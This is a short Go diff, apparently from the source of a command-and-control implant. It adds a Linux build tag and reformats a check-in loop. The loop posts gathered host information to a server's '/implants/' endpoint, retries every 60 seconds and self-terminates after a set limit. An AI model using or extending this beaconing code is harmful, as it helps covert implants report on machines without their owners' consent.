@@ -1,3 +1,5 @@
+//go:build linux
+
 package agent_helper
 
 import (
@@ -72,11 +74,11 @@ func GatherInfo() InitialInfo {
 func InitialCheckin(serverUrl string, initialInfo InitialInfo) {
 	for i := 0; i <= CallbackTimer.SelfTerminate; i++ {
 		if i >= CallbackTimer.SelfTerminate {
-				TerminateImplant()
+			TerminateImplant()
 		}
 		resp, err := PostJson(serverUrl+"/implants/", initialInfo)
 		if err != nil || resp != 200 {
-			
+
 			time.Sleep(60 * time.Second)
 		} else {
 			return
